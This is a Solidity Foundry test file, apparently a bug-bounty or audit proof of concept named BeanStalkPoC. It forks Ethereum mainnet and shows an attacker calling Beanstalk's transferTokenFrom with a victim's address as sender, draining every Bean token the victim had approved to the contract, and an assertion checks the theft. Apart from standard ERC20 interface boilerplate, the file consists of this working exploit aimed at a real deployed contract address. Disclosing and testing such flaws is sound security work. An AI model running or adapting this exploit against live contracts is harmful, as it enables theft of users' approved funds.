// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
// RPC_URL=$ALCHEMY_API forge test --match-contract BeanStalkPoC -vvv

contract BeanStalkPoC is Test {
    IBEAN beanstalk = IBEAN(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IERC20 bean = IERC20(0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab);

    address attacker;
    address victim;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), 15970150);
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        deal(address(bean), victim, 10000e18);
    }

    function testPoC() public {
        vm.prank(victim);
        bean.approve(address(beanstalk),10000e18);

        console.log("ALLOWANCE FOR BEAN TOKENS: ",bean.allowance(victim,address(beanstalk)));
        uint256 victimBalBefore = bean.balanceOf(victim);
        uint256 attackerBalBefore = bean.balanceOf(attacker);

        vm.prank(attacker);
        beanstalk.transferTokenFrom(bean,victim,attacker,victimBalBefore,LibTransfer.From.EXTERNAL,LibTransfer.To.EXTERNAL);

        uint256 victimBalAfter = bean.balanceOf(victim);
        uint256 attackerBalAfter = bean.balanceOf(attacker);
        assertEq(attackerBalAfter, victimBalBefore);

        console.log("victim balBefore : ",victimBalBefore,", victim balAfter :",victimBalAfter);
        console.log("attacker balBefore: ",attackerBalBefore,", attacker balAfter :",attackerBalAfter);
    }
}

library LibTransfer {
    enum From {
        EXTERNAL,
        INTERNAL,
        EXTERNAL_INTERNAL,
        INTERNAL_TOLERANT
    }
    enum To {
        EXTERNAL,
        INTERNAL
    }
}

interface IBEAN {
        function transferTokenFrom(
        IERC20 token,
        address sender,
        address recipient,
        uint256 amount,
        LibTransfer.From fromMode,
        LibTransfer.To toMode) external;
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}